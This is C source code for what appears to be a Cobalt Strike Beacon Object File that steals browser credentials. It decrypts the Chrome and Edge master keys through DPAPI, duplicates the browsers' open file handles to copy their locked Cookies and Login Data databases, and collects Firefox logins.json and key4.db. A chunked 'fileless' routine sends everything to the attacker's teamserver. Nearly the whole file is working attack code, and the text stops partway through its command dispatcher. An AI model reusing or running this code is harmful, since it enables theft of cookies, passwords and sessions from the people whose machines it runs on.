// Code based on mr.un1k0d3r's seasonal videos and his cookie-grabber POC
// https://github.com/Mr-Un1k0d3r/Cookie-Graber-BOF/blob/main/cookie-graber.c
// fileless download based on nanodump methods
// https://github.com/fortra/nanodump

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include "cookie-monster-bof.h"
#include "beacon.h"

CHAR *GetFileContent(CHAR *path);
CHAR *ExtractKey(CHAR *buffer);
VOID GetMasterKey(CHAR *key);
VOID GetChromeKey();
VOID GetFirefoxInfo();
VOID GetEdgeKey();
CHAR *GetFirefoxFile(CHAR *file, CHAR* profile);
VOID GetChromePID();
VOID GetEdgePID();
BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *filename);

WINBASEAPI DWORD   WINAPI KERNEL32$GetLastError (VOID);
WINBASEAPI HANDLE  WINAPI KERNEL32$CreateFileA (LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
WINBASEAPI DWORD   WINAPI KERNEL32$GetFileSize (HANDLE hFile, LPDWORD lpFileSizeHigh);
WINBASEAPI HGLOBAL WINAPI KERNEL32$GlobalAlloc (UINT uFlags, SIZE_T dwBytes);
WINBASEAPI BOOL WINAPI    KERNEL32$ReadFile (HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
WINBASEAPI BOOL WINAPI    KERNEL32$CloseHandle (HANDLE hObject);
WINBASEAPI char* __cdecl  MSVCRT$strstr (char* _String, const char* _SubString);
WINBASEAPI size_t __cdecl MSVCRT$strlen (const char *s);
WINBASEAPI char* __cdecl  MSVCRT$strncpy (char * __dst, const char * __src, size_t __n);
WINBASEAPI char* __cdecl  MSVCRT$strncat (char * _Dest,const char * _Source, size_t __n);
DECLSPEC_IMPORT int WINAPI MSVCRT$strcmp(const char*, const char*);
WINBASEAPI BOOL  WINAPI   CRYPT32$CryptUnprotectData (DATA_BLOB *pDataIn, LPWSTR *ppszDataDescr, DATA_BLOB *pOptionalEntropy, PVOID pvReserved, CRYPTPROTECT_PROMPTSTRUCT *pPromptStruct, DWORD dwFlags, DATA_BLOB *pDataOut);
WINBASEAPI HGLOBAL WINAPI KERNEL32$GlobalFree (HGLOBAL hMem);
WINBASEAPI HANDLE WINAPI  KERNEL32$CreateToolhelp32Snapshot(DWORD dwFlags,DWORD th32ProcessID);
WINBASEAPI BOOL WINAPI    KERNEL32$Process32First(HANDLE hSnapshot,LPPROCESSENTRY32 lppe);
WINBASEAPI BOOL WINAPI    KERNEL32$Process32Next(HANDLE hSnapshot,LPPROCESSENTRY32 lppe);
// WINBASEAPI HANDLE WINAPI  KERNEL32$GetCurrentProcess (VOID);
WINBASEAPI DWORD WINAPI KERNEL32$GetFileType(HANDLE hFile);
WINBASEAPI BOOL WINAPI    KERNEL32$DuplicateHandle (HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwOptions);
WINBASEAPI HANDLE WINAPI  KERNEL32$OpenProcess (DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
WINBASEAPI BOOL WINAPI    CRYPT32$CryptStringToBinaryA (LPCSTR pszString, DWORD cchString, DWORD dwFlags, BYTE *pbBinary, DWORD *pcbBinary, DWORD *pdwSkip, DWORD *pdwFlags);
WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress (HMODULE hModule, LPCSTR lpProcName);
WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA (LPCSTR lpLibFileName);
WINBASEAPI DWORD WINAPI   KERNEL32$SetFilePointer (HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
//WINBASEAPI VOID WINAPI    KERNEL32$SetLastError (DWORD dwErrCode);
DECLSPEC_IMPORT NTSTATUS WINAPI NTDLL$NtQuerySystemInformation(int SystemInformationClass,PVOID SystemInformation,ULONG SystemInformationLength,PULONG ReturnLength);
WINBASEAPI void __cdecl MSVCRT$memset(void *dest, int c, size_t count);
WINBASEAPI BOOL WINAPI KERNEL32$HeapFree (HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap (VOID);
WINBASEAPI LPVOID WINAPI KERNEL32$HeapAlloc (HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtQueryObject(HANDLE, OBJECT_INFORMATION_CLASS, PVOID, ULONG, PULONG);

#define IMPORT_RESOLVE FARPROC SHGetFolderPath = Resolver("shell32", "SHGetFolderPathA"); \
    FARPROC PathAppend = Resolver("shlwapi", "PathAppendA"); \
    FARPROC sprintf = Resolver("msvcrt", "sprintf"); \
    FARPROC srand = Resolver("msvcrt", "srand");\
    FARPROC time = Resolver("msvcrt", "time");\
    FARPROC strnlen = Resolver("msvcrt", "strnlen");\
    FARPROC rand = Resolver("msvcrt", "rand");\
    FARPROC realloc = Resolver("msvcrt", "realloc");\
    FARPROC malloc = Resolver("msvcrt", "malloc");\
    FARPROC free = Resolver("msvcrt", "free");
#define intAlloc(size) KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, size)
#define intFree(addr) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, addr)
#define DATA_FREE(d, l) \
    if (d) { \
        MSVCRT$memset(d, 0, l); \
        intFree(d); \
        d = NULL; \
    }
#define CSIDL_LOCAL_APPDATA 0x001c
#define CSIDL_APPDATA 0x001a

//workaround for no slot for function (reduce number of Win32 APIs called) 
FARPROC Resolver(CHAR *lib, CHAR *func) {
    FARPROC ptr = KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA(lib), func);
    return ptr;
}

CHAR *GetFileContent(CHAR *path) {
    CHAR appdata[MAX_PATH];
    HANDLE hFile = NULL;
    IMPORT_RESOLVE;

    //get appdata local path and append path 
    SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata);
    PathAppend(appdata, path);

    BeaconPrintf(CALLBACK_OUTPUT, "LOOKING FOR FILE: %s \n", appdata);
    
    //get handle to appdata
    hFile = KERNEL32$CreateFileA(appdata, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE) {
        return NULL;
    }

    CHAR *buffer = NULL;
    DWORD dwSize = 0;
    DWORD dwRead = 0;

    //read cookie file and return as buffer var
    dwSize = KERNEL32$GetFileSize(hFile, NULL);
    buffer = (CHAR*)KERNEL32$GlobalAlloc(GPTR, dwSize + 1);
    KERNEL32$ReadFile(hFile, buffer, dwSize, &dwRead, NULL);

    if(dwSize != dwRead) {
        BeaconPrintf(CALLBACK_OUTPUT,"file size mismatch.\n");
    }
    KERNEL32$CloseHandle(hFile);
    return buffer;
}

CHAR *ExtractKey(CHAR *buffer) {
    //look for pattern with key
    CHAR pattern[] = "encrypted_key\":\"";
    CHAR *start = MSVCRT$strstr(buffer, pattern);
    CHAR *end = NULL;
    CHAR *key = NULL;
    DWORD dwSize = 0;
    
    if(start == NULL) {
        return NULL;
    }
    //BeaconPrintf(CALLBACK_OUTPUT,"Encrpyted string start at 0x%p buffer start at 0x%p \n", start, buffer);
    
    // calc length of key
    start += MSVCRT$strlen(pattern);
    buffer = start;
    end = MSVCRT$strstr(buffer, "\"");

    if(end == NULL) {
        return NULL;
    }
    dwSize = end - start;
    //BeaconPrintf(CALLBACK_OUTPUT,"Encrpyted data size is %d\n", dwSize);

    //extract key from file
    key = (CHAR*)KERNEL32$GlobalAlloc(GPTR, dwSize + 1);
    MSVCRT$strncpy(key, buffer, dwSize);
    return key;
}

VOID GetMasterKey(CHAR *key) {
    BYTE *byteKey = NULL;
    DWORD dwOut = 0;
    IMPORT_RESOLVE;

    //calculate size of key
    CRYPT32$CryptStringToBinaryA(key, MSVCRT$strlen(key), CRYPT_STRING_BASE64, NULL, &dwOut, NULL, NULL);
    //BeaconPrintf(CALLBACK_OUTPUT,"base64 size needed is %d.\n", dwOut);

    //base64 decode key
    byteKey = (CHAR*)KERNEL32$GlobalAlloc(GPTR, dwOut);
    CRYPT32$CryptStringToBinaryA(key, MSVCRT$strlen(key), CRYPT_STRING_BASE64, byteKey, &dwOut, NULL, NULL);  
    byteKey += 5;
    
    DATA_BLOB db;
    DATA_BLOB final;
    db.pbData = byteKey;
    db.cbData = dwOut;

    //decrypt key with dpapi for current user
    BOOL result = CRYPT32$CryptUnprotectData(&db, NULL, NULL, NULL, NULL, 0, &final);
    if(!result) {
        BeaconPrintf(CALLBACK_ERROR,"Decrypting the key failed.\n");
        return;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "Decrypted Key!");

    // return decrypted key
    CHAR *output = (CHAR*)KERNEL32$GlobalAlloc(GPTR, (final.cbData * 4) + 1);
    DWORD i = 0;
    for(i = 0; i < final.cbData; i++) {
        sprintf(output, "%s\\x%02x", output, final.pbData[i]);
    }
    BeaconPrintf(CALLBACK_OUTPUT,"Decrypt Key: %s \n", output );

    // rewind to the start of the buffer
    KERNEL32$GlobalFree(byteKey - 5);
    KERNEL32$GlobalFree(output);
}

VOID GetChromeKey() {
    //get chrome key
    CHAR *data = GetFileContent("\\Google\\Chrome\\User Data\\Local State");
    CHAR *key = NULL;

    if(data == NULL) {
        BeaconPrintf(CALLBACK_ERROR,"Reading the file failed.\n");
        return;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "Got Chrome Local State File");
    key = ExtractKey(data);
    KERNEL32$GlobalFree(data);
    if(key == NULL) {
        BeaconPrintf(CALLBACK_ERROR,"getting the key failed.\n");
        return;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "Got Chrome Key ");
    GetMasterKey(key);
    return;
}

VOID GetEdgeKey() {
    //get edge key
    CHAR *data = GetFileContent("\\Microsoft\\Edge\\User Data\\Local State");
    CHAR *key = NULL;
    if(data == NULL) {
        BeaconPrintf(CALLBACK_ERROR,"Reading the file failed.\n");
        return;
    }

    key = ExtractKey(data);
    KERNEL32$GlobalFree(data);
    if(key == NULL) {
        BeaconPrintf(CALLBACK_ERROR,"getting the key failed.\n");
        return;
    }
    GetMasterKey(key);
}

CHAR *GetFirefoxFile(CHAR *file, CHAR* profile){
    CHAR *appdata = NULL;
    CHAR *tempProfile = NULL;
    IMPORT_RESOLVE;
    // create temp var to hold profile
    tempProfile = (CHAR*)KERNEL32$GlobalAlloc(GPTR, MSVCRT$strlen(profile) + 1);
    MSVCRT$strncpy(tempProfile, profile, MSVCRT$strlen(profile)+1);
    appdata = (CHAR*)KERNEL32$GlobalAlloc(GPTR, MAX_PATH + 1);

    //get appdata local path and append path to file
    SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, appdata);
    file = MSVCRT$strncat(tempProfile, file, MSVCRT$strlen(file)+1);
    PathAppend(appdata, "\\Mozilla\\Firefox\\Profiles");
    PathAppend(appdata, file);
    KERNEL32$GlobalFree(tempProfile);

    return appdata;
}

VOID GetFirefoxInfo() {
    //get firefox key
    CHAR appdata[MAX_PATH];
    HANDLE hFile = NULL;
    IMPORT_RESOLVE;

    //get appdata local path and append path 
    SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, appdata);
    PathAppend(appdata, "\\Mozilla\\Firefox\\profiles.ini");
    //BeaconPrintf(CALLBACK_OUTPUT,"Firefox profile info be at: %s \n", appdata );

    //get handle to appdata
    hFile = KERNEL32$CreateFileA(appdata, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR,"File not found at: %s \n", appdata);
        BeaconPrintf(CALLBACK_ERROR,"Firefox not found on host\n");
        return;
    }
    
    CHAR *buffer = NULL;
    DWORD dwSize = 0;
    DWORD dwRead = 0;

    //read profiles.ini file and return as buffer var
    dwSize = KERNEL32$GetFileSize(hFile, NULL);
    buffer = (CHAR*)KERNEL32$GlobalAlloc(GPTR, dwSize + 1);
    KERNEL32$ReadFile(hFile, buffer, dwSize, &dwRead, NULL);
    if(dwSize != dwRead) {
        BeaconPrintf(CALLBACK_ERROR,"file size mismatch.\n");
    }
    KERNEL32$CloseHandle(hFile);
    
    //look for pattern Default=Profiles/
    CHAR pattern[] = "Default=Profiles/";
    CHAR *start = MSVCRT$strstr(buffer, pattern);
    CHAR *end = NULL;
    if(start == NULL) {
        return;
    }
    
    // calc length of profile
    start += MSVCRT$strlen(pattern);
    buffer = start;
    end = MSVCRT$strstr(buffer, ".default-release");

    if(end == NULL) {
        return ;
    }
    dwSize = end - start;
    //BeaconPrintf(CALLBACK_OUTPUT, "Profile size is %d\n", dwSize);

    //extract profile from file
    CHAR *profile = NULL;
    profile = (CHAR*)KERNEL32$GlobalAlloc(GPTR, dwSize + 1);
    MSVCRT$strncpy(profile, buffer, dwSize);

    BeaconPrintf(CALLBACK_OUTPUT,"Firefox Default Profile: %s \n", profile );

    // get path to logins.json
    CHAR *logins = NULL;
    logins = GetFirefoxFile(".default-release\\logins.json", profile);
    //BeaconPrintf(CALLBACK_OUTPUT,"Logins: %s \n", logins );

    //check if logins.json exists
    hFile = KERNEL32$CreateFileA(logins, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR,"File not found at: %s \n", logins);
        return;
    }
    else{
        BeaconPrintf(CALLBACK_OUTPUT,"Firefox Stored Credentials found at: %s \n", logins);
        DWORD dwRead = 0;
        DWORD dwFileSize = KERNEL32$GetFileSize(hFile, NULL);
        CHAR *buffer = (CHAR*)KERNEL32$GlobalAlloc(GPTR, dwFileSize);
        KERNEL32$ReadFile(hFile, buffer, dwFileSize, &dwRead, NULL);
        download_file(logins, buffer, dwFileSize);
        KERNEL32$GlobalFree(buffer);
        KERNEL32$CloseHandle(hFile);  
    }

    // get path to logins.json
    CHAR *database = NULL;
    database = GetFirefoxFile(".default-release\\key4.db", profile);

    //check if key4.db exists
    hFile = KERNEL32$CreateFileA(database, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR,"File not found at: %s \n", database);
        return;
    }
    else{
        BeaconPrintf(CALLBACK_OUTPUT,"Firefox Database found at: %s \n", database);
        DWORD dwRead = 0;
        DWORD dwFileSize = KERNEL32$GetFileSize(hFile, NULL);
        CHAR *buffer = (CHAR*)KERNEL32$GlobalAlloc(GPTR, dwFileSize);
        KERNEL32$ReadFile(hFile, buffer, dwFileSize, &dwRead, NULL);
        download_file(database, buffer, dwFileSize);
        KERNEL32$GlobalFree(buffer);
        KERNEL32$CloseHandle(hFile);
    }

}

VOID GetChromePID() {
    //get handle to all processes
    HANDLE hSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32;
    INT processCount = 0;
    BOOL databaseStatus = FALSE;
    BOOL passwordStatus = FALSE;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    //iterate through each handle to find chrome.exe
    if(KERNEL32$Process32First(hSnap, &pe32)) {
        do {
            if(MSVCRT$strcmp(pe32.szExeFile, "chrome.exe") == 0) 
            {
                //chrome was found, get cookies database
                processCount++;
                if (databaseStatus == FALSE){
                    if (GetBrowserFile(pe32.th32ProcessID, "Network\\Cookies\0", "ChromeCookie.db")){
                        databaseStatus = TRUE;
                    }
                }
                if (passwordStatus == FALSE){
                    if (GetBrowserFile(pe32.th32ProcessID, "Login Data\0", "ChromePasswords.db")){
                        passwordStatus = TRUE;
                    }
                }

            }
        } while(KERNEL32$Process32Next(hSnap, &pe32));
    }
    KERNEL32$CloseHandle(hSnap);
    //check if process was running
    if (processCount == 0) {
        //check if file exists
        BeaconPrintf(CALLBACK_OUTPUT,"chrome.exe not found on host\n");
        CHAR *data = GetFileContent("\\Google\\Chrome\\User Data\\Default\\Network\\Cookies");
        if(data == NULL) {
            BeaconPrintf(CALLBACK_ERROR,"Chrome COOKIES not found on host\n");
            return;
        }

        download_file("ChromeCookie.db",data, sizeof(data));
        KERNEL32$GlobalFree(data);

        CHAR *passwordData = GetFileContent("\\Google\\Chrome\\User Data\\Login Data");
        if(passwordData == NULL) {
            BeaconPrintf(CALLBACK_ERROR,"Chrome LOGIN DATA not found on host\n");
            return;
        }
        download_file("ChromePasswords.db",passwordData, sizeof(passwordData));
        KERNEL32$GlobalFree(passwordData);
    }
}

BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName) {
    IMPORT_RESOLVE;
    
    BeaconPrintf(CALLBACK_OUTPUT,"Browser PID found %d\n", PID);
    BeaconPrintf(CALLBACK_OUTPUT,"Searching for handle to %s \n", browserFile);
    
    SYSTEM_HANDLE_INFORMATION_EX *shi = NULL;
    DWORD dwNeeded = 0;
    DWORD dwSize = 0xffffff / 2;
    shi = (SYSTEM_HANDLE_INFORMATION_EX *)KERNEL32$GlobalAlloc(GPTR, dwSize);
    
    //utilize NtQueryStemInformation to list all handles on system
    NTSTATUS status = NTDLL$NtQuerySystemInformation(SystemHandleInformationEx, shi, dwSize, &dwNeeded);
    if(status == STATUS_INFO_LENGTH_MISMATCH)
    {
        dwSize = dwNeeded;
        shi = (SYSTEM_HANDLE_INFORMATION_EX*)realloc(shi, dwSize);
        if (dwSize == NULL)
        {
            BeaconPrintf(CALLBACK_ERROR, "Failed to reallocate memory for handle information.\n");
            KERNEL32$GlobalFree(shi);
            return FALSE;
        }
    }
    status = NTDLL$NtQuerySystemInformation(SystemHandleInformationEx, shi, dwSize, &dwNeeded);
    if(status != 0)
    {
        BeaconPrintf(CALLBACK_ERROR,"NtQuerySystemInformation failed with status 0x%x.\n",status);
        KERNEL32$GlobalFree(shi);
        return FALSE;
    }
    //BeaconPrintf(CALLBACK_OUTPUT,"Handle Count %d\n", shi->NumberOfHandles);
    DWORD i = 0;
    BOOL firstHandle = TRUE;
    //iterate through each handle and find our PID and a handle to a file
    for(i = 0; i < shi->NumberOfHandles; i++) {
        SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handle = shi->Handles[i];
        if((DWORD)(ULONG_PTR)handle.UniqueProcessId == PID) {
            //BeaconPrintf(CALLBACK_OUTPUT, "Found PID");
            POBJECT_NAME_INFORMATION objectNameInfo = (POBJECT_NAME_INFORMATION)malloc(0x1000);
            ULONG returnLength = 0;
            NTSTATUS ret = 0;
            if(handle.GrantedAccess != 0x001a019f || ( handle.HandleAttributes != 0x2 && handle.GrantedAccess == 0x0012019f)) {
                HANDLE hProc = KERNEL32$OpenProcess(PROCESS_DUP_HANDLE, FALSE, PID);
                if(hProc == INVALID_HANDLE_VALUE) {
                    BeaconPrintf(CALLBACK_ERROR,"OpenProcess failed %d\n", KERNEL32$GetLastError());
                    KERNEL32$GlobalFree(shi);
                    free(objectNameInfo);
                    return FALSE;
                }

                HANDLE hDuplicate = NULL;
                if(!KERNEL32$DuplicateHandle(hProc, (HANDLE)(intptr_t)handle.HandleValue, (HANDLE) -1, &hDuplicate, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
                    //BeaconPrintf(CALLBACK_ERROR,"DuplicateHandle failed %d\n", KERNEL32$GetLastError());
                    continue;                  
                }
                //Check if the handle exists on disk, otherwise the program will hang
                DWORD fileType = KERNEL32$GetFileType(hDuplicate);
                if (fileType != FILE_TYPE_DISK) {
                    //BeaconPrintf(CALLBACK_ERROR, "NOT A FILE");
                    continue;
                }
                //BeaconPrintf(CALLBACK_OUTPUT,"Duplicated Handle, confirmed file on disk");
                ret = NTDLL$NtQueryObject(hDuplicate,ObjectNameInformation, objectNameInfo, 0x1000, &returnLength);
                
                if (ret != 0)
                {
                    BeaconPrintf(CALLBACK_ERROR,"Failed NtQueryObject");
                    KERNEL32$GlobalFree(shi);
                    free(objectNameInfo);
                    return FALSE;
                }
                if (ret == 0 && objectNameInfo->Name.Length > 0){
                    char handleName[1024];
                    sprintf(handleName, "%.*ws", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);

                    PPUBLIC_OBJECT_TYPE_INFORMATION objectTypeInfo = (PPUBLIC_OBJECT_TYPE_INFORMATION)malloc(0x1000);
                    ret = NTDLL$NtQueryObject(hDuplicate,ObjectTypeInformation, objectTypeInfo, 0x1000, &returnLength);
                    if (ret != 0)
                    {
                        BeaconPrintf(CALLBACK_ERROR,"Failed NtQueryObject");
                        KERNEL32$GlobalFree(shi);
                        free(objectTypeInfo);
                        free(objectNameInfo);
                        return FALSE;
                    }
                    if (ret == 0 && (MSVCRT$strcmp(objectTypeInfo,"File"))){
                        //BeaconPrintf(CALLBACK_OUTPUT, "%s\n", handleName);
                        //BeaconPrintf(CALLBACK_OUTPUT, "%d\n", MSVCRT$strlen(handleName));
                        if (MSVCRT$strstr(handleName, browserFile) != NULL && (MSVCRT$strcmp(&handleName[MSVCRT$strlen(handleName) - 4], "Data") == 0 || MSVCRT$strcmp(&handleName[MSVCRT$strlen(handleName) - 7], "Cookies") == 0)){

                            BeaconPrintf(CALLBACK_OUTPUT,"%s WAS FOUND\n", browserFile);
                            BeaconPrintf(CALLBACK_OUTPUT, "Handle Name: %.*ws\n", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);

                            KERNEL32$SetFilePointer(hDuplicate, 0, 0, FILE_BEGIN);
                            DWORD dwFileSize = KERNEL32$GetFileSize(hDuplicate, NULL);
                            BeaconPrintf(CALLBACK_OUTPUT,"file size is %d\n", dwFileSize);
                            DWORD dwRead = 0;
                            CHAR *buffer = (CHAR*)KERNEL32$GlobalAlloc(GPTR, dwFileSize);
                            KERNEL32$ReadFile(hDuplicate, buffer, dwFileSize, &dwRead, NULL);

                            download_file(downloadFileName,buffer, dwFileSize);
                            
                            KERNEL32$GlobalFree(buffer);
                            KERNEL32$GlobalFree(shi);
                            free(objectTypeInfo);
                            free(objectNameInfo);
                            return TRUE;
                        }
                        
                    }else{
                        KERNEL32$CloseHandle(hDuplicate);
                        free(objectTypeInfo);
                        free(objectNameInfo);
                    }
                }
            }
        }
    }
    BeaconPrintf(CALLBACK_ERROR,"NO HANDLE TO %s WAS FOUND \n", browserFile);
    return FALSE;
}

VOID GetEdgePID() {
    //get handle to all processes
    HANDLE hSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32;
    INT processCount = 0;
    BOOL databaseStatus = FALSE;
    BOOL passwordStatus = FALSE;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    //iterate through each handle to find chrome.exe
    if(KERNEL32$Process32First(hSnap, &pe32)) {
        do {
            //BeaconPrintf(CALLBACK_OUTPUT, "Process: %s\n", pe32.szExeFile);
            if(MSVCRT$strcmp(pe32.szExeFile, "msedge.exe") == 0) 
            {
                //edge was found, get cookies database
                processCount++;
                if (databaseStatus == FALSE){
                    if (GetBrowserFile(pe32.th32ProcessID, "Network\\Cookies", "EdgeCookie.db")){
                        databaseStatus = TRUE;
                    }
                }
                if (passwordStatus == FALSE){
                    if (GetBrowserFile(pe32.th32ProcessID, "Login Data", "EdgePasswords.db")){
                        passwordStatus = TRUE;
                    }
                }
            }
        } while(KERNEL32$Process32Next(hSnap, &pe32));
    }
    KERNEL32$CloseHandle(hSnap);
    //check if process was running
    if (processCount == 0) {
        //check if file exists
        BeaconPrintf(CALLBACK_OUTPUT,"msedge.exe not found running on host\n Downloading cookies directly from \\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies ");
        CHAR *data = GetFileContent("\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies");
        if(data == NULL) {
            BeaconPrintf(CALLBACK_ERROR,"Edge COOKIES not found on host\n");
            return;
        }
        download_file("EdgeCookie.db",data, sizeof(data));

        KERNEL32$GlobalFree(data);
        CHAR *passwordData = GetFileContent("\\Microsoft\\Edge\\User Data\\Default\\Login Data");
        if(passwordData == NULL) {
            BeaconPrintf(CALLBACK_ERROR,"Edge LOGIN DATA not found on host\n");
            return;
        }
        download_file("EdgePasswords.db",passwordData, sizeof(passwordData));
    }
}

// nanodump fileless download
BOOL download_file( IN LPCSTR fileName, IN char fileData[], IN ULONG32 fileLength)
{
    IMPORT_RESOLVE;
    int fileNameLength = strnlen(fileName, 256);

    // intializes the random number generator
    time_t t;
    srand((unsigned) time(&t));

    // generate a 4 byte random id, rand max value is 0x7fff
    ULONG32 fileId = 0;
    fileId |= (rand() & 0x7FFF) << 0x11;
    fileId |= (rand() & 0x7FFF) << 0x02;
    fileId |= (rand() & 0x0003) << 0x00;

    // 8 bytes for fileId and fileLength
    int messageLength = 8 + fileNameLength;
    char* packedData = intAlloc(messageLength);
    if (!packedData)
    {
        BeaconPrintf(CALLBACK_ERROR, "Could not allocate memory for the file. Last Error %d", KERNEL32$GetLastError());
        return FALSE;
    }

    // pack on fileId as 4-byte int first
    packedData[0] = (fileId >> 0x18) & 0xFF;
    packedData[1] = (fileId >> 0x10) & 0xFF;
    packedData[2] = (fileId >> 0x08) & 0xFF;
    packedData[3] = (fileId >> 0x00) & 0xFF;

    // pack on fileLength as 4-byte int second
    packedData[4] = (fileLength >> 0x18) & 0xFF;
    packedData[5] = (fileLength >> 0x10) & 0xFF;
    packedData[6] = (fileLength >> 0x08) & 0xFF;
    packedData[7] = (fileLength >> 0x00) & 0xFF;

    // pack on the file name last
    for (int i = 0; i < fileNameLength; i++)
    {
        packedData[8 + i] = fileName[i];
    }

    // tell the teamserver that we want to download a file
    BeaconOutput(CALLBACK_FILE,packedData,messageLength);
    DATA_FREE(packedData, messageLength);

    // we use the same memory region for all chucks
    int chunkLength = 4 + CHUNK_SIZE;
    char* packedChunk = intAlloc(chunkLength);
    if (!packedChunk)
    {
        BeaconPrintf(CALLBACK_ERROR, "Could not allocate memory for the file. Last Error %d", KERNEL32$GetLastError());
        return FALSE;
    }
    // the fileId is the same for all chunks
    packedChunk[0] = (fileId >> 0x18) & 0xFF;
    packedChunk[1] = (fileId >> 0x10) & 0xFF;
    packedChunk[2] = (fileId >> 0x08) & 0xFF;
    packedChunk[3] = (fileId >> 0x00) & 0xFF;

    ULONG32 exfiltrated = 0;
    while (exfiltrated < fileLength)
    {
        // send the file content by chunks
        chunkLength = fileLength - exfiltrated > CHUNK_SIZE ? CHUNK_SIZE : fileLength - exfiltrated;
        ULONG32 chunkIndex = 4;
        for (ULONG32 i = exfiltrated; i < exfiltrated + chunkLength; i++)
        {
            packedChunk[chunkIndex++] = fileData[i];
        }
        // send a chunk
        BeaconOutput(
            CALLBACK_FILE_WRITE,
            packedChunk,
            4 + chunkLength);
        exfiltrated += chunkLength;
    }
    DATA_FREE(packedChunk, chunkLength);

    // tell the teamserver that we are done writing to this fileId
    char packedClose[4];
    packedClose[0] = (fileId >> 0x18) & 0xFF;
    packedClose[1] = (fileId >> 0x10) & 0xFF;
    packedClose[2] = (fileId >> 0x08) & 0xFF;
    packedClose[3] = (fileId >> 0x00) & 0xFF;
    BeaconOutput(
        CALLBACK_FILE_CLOSE,
        packedClose,
        4);
    BeaconPrintf(CALLBACK_OUTPUT,"The file was downloaded filessly");
    return TRUE;
}

VOID go(char *buf, int len) {
    //parse command line arguements
    datap parser;
    int chrome = 1;
    int edge = 1; 
    int firefox = 1;
    int chromeCookiesPID = 1;
    int chromeLoginDataPID = 1;
    int edgeCookiesPID = 1;
    int edgeLoginDataPID = 1;
    int pid = 1; 
    
    BeaconDataParse(&parser, buf, len);

    chrome = BeaconDataInt(&parser);
    edge = BeaconDataInt(&parser);
    firefox = BeaconDataInt(&parser);
    chromeCookiesPID = BeaconDataInt(&parser);
    chromeLoginDataPID = BeaconDataInt(&parser);
    edgeCookiesPID = BeaconDataInt(&parser);
    edgeLoginDataPID = BeaconDataInt(&parser);
    pid = BeaconDataInt(&parser);

    if (chrome == 0 ){
        BeaconPrintf(CALLBACK_OUTPUT, "CHROME SELECTED");
        GetChromeKey();
        GetChromePID();
        return;
    }
    else if (edge == 0 ){
        BeaconPrintf(CALLBACK_OUTPUT, "EDGE SELECTED");
        GetEdgeKey();
        GetEdgePID();
        return;
    }
    else if (firefox == 0 ){
        BeaconPrintf(CALLBACK_OUTPUT, "FIREFOX SELECTED");
        GetFirefoxInfo();
        return;
    }
    else if (chromeCookiesPID == 0){
        BeaconPrintf(CALLBACK_OUTPUT, "CHROME Cookies SELECTED");
        BeaconPrintf(CALLBACK_OUTPUT, "PID: %d", pid);
        GetChromeKey();
        GetBrowserFile(pid, "Cookies", "ChromeCookie.db");
        return;
    }
    else if (chromeLoginDataPID == 0){
        BeaconPrintf(CALLBACK_OUTPUT, "CHROME Login Data SELECTED");
        BeaconPrintf(CALLBACK_OUTPUT, "PID: %d", pid);
        GetChromeKey();
        GetBrowserFile(pid, "Login Data", "ChromePasswords.db");
        return;
    }
    else if (edgeCookiesPID == 0){
        BeaconPrintf(CALLBACK_OUTPUT, "EDGE Cookies SELECTED");
        BeaconPrintf(CALLBACK_OUTPUT, "PID: %d", pid);
        GetEdgeKey();
        GetBrowserFile(pid, "Cookies", "EdgeCookie.db");
        return;
    }
